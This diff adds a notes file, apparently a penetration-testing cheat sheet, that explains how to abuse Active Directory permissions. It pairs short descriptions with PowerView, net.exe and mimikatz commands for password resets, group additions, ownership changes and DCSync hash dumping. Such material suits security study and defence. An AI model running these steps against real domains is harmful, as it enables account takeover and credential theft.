@@ -1,0 +1,82 @@
+Dangerous privilege:
+
+1. ForceChangePassword:
+- Description: 
+The "ForceChangePassword" is a permission that allows the principal to change another user's password without needing the current password of the target.
+- Exploit: 
+There are two ways to perform this attack. 
+The first is using Windows built-in net.exe binary from Windows. The command to change user: net user [USERNAME] [PASSWORD] /domain.
+The second method is by using PowerView.ps1 (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and Set-DomainUserPassword function.
+The command to exploit:
++ import-module .\PowerView.ps1
++ $pass = ConvertTo-SecureString '[New Password]' -AsPlainText -Force
++ set-domainuserpassword -identity [target_user] -accountpassword $pass 
++ runas /user:[domain\user] cmd.exe
+
+2. GenericAll:
+- Description: 
+The principal having this permission will have full rights to the object.
+- Exploit:
+Because full control of an object opens many different methods to exploit, such as changing passwords, changing permissions, or adding to groups. For more detail, refer to other exploits.
+
+3. WriteDACL:
+- Description: 
+Having this permission allow user to modify object's DACL, and grant attacker full control right over 
+- Exploit:
+Execute the following command to grant the right you need:
++ Users: Add-DomainObjectAcl -TargetIdentity "User Name" -Rights All // refer to ForceChangePassword and GenericAll exploit
++ Groups:  Add-DomainObjectAcl -TargetIdentity "Group Name" -Rights WriteMembers // refer to AddMember exploit
++ Domains: Add-DomainObjectAcl -TargetIdentity "Domain Name" -Rights DCSync // refer to DCSync exploit
++ Computers: Add-DomainObjectAcl -TargetIdentity "Computer Name" -Rights All
+
+4. GenericWrite:
+- Description:
+This permission allows you to write to any non-protected attributes of an Active Directory object
+- Exploit:
++ User: Modify the servicePrincipalName attribute to prepare for a Kerberoasting attack, extracting the service ticket for offline brute-forcing.
++ Groups: Add your user account or another controlled principal to the group. This is particularly impactful if the group has elevated privileges (e.g., Domain Admins, Backup Operators).
+
+5. WriteOwner:
+- Description:
+This privilege allows attacker to gain control over critical objects by changing ownership or modifying the DACL to grant additional permissions.
+- Expolit:
+By using PowerView.ps1 (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and Set-DomainObjectOwner function.
++ import-module .\PowerView.ps1
+Create a PSCredential object (these examples comes from the PowerView help documentation):
++ $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
++ $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
++ Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
+Attacker now able to modify the DACL when having ownership of the object.
+
+6. AllExtendedRights
+- Description:
+Granted on objects which allow reading of privileged attributes and performing special actions.
+- Expolit:
++ User: Having this privilege over a user grants the ability to reset the user’s password
++ Domain: The AllExtendedRights privilege grants both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain. This can be abused using the lsadump::dcsync command in mimikatz
++ Computers: You may perform resource-based constrained delegation with this privilege over a computer object.
+
+7. AddMember
+- Description:
+The principal has the ability to add arbitrary principlas to the target security group. Because of security group delegation, the members of a security group have the same privileges as that group.
+- Exploit:
++ Using buitin net.exe: net group [GROUP NAME] [USERNAME] /add /domain
++ Using PowerView.ps1 and Add-DomainGroupMember:
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword) 
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
+Get-DomainGroupMember -Identity 'Domain Admins'
+
+8. GetChanges and GetChangesAll
+- Description:
+The combination of both these privileges grants a principal the ability to perform the DCSync attack.
+- Exploit:
+If a principal have GetChanges and GetChangesAll permissions, it able to perform DCSync attack to get the password hash of other prinicipal by using mimikatz: 
+lsadump::dcsync /domain:testlab.local /user:Administrator
+
+9. DCSync
+- Description:
+DCSync is the combination of both GetChanges and GetChangesAll. This permission allow attacker to impersonate a Domain Controller to request all password hash from the target Domain Controller by using  the Directory Replication Services (DRS).
+- Exploit:
+If a principal have GetChanges and GetChangesAll permissions, it able to perform DCSync attack to get the password hash of other prinicipal by using mimikatz: 
+lsadump::dcsync /domain:testlab.local /user:Administrator
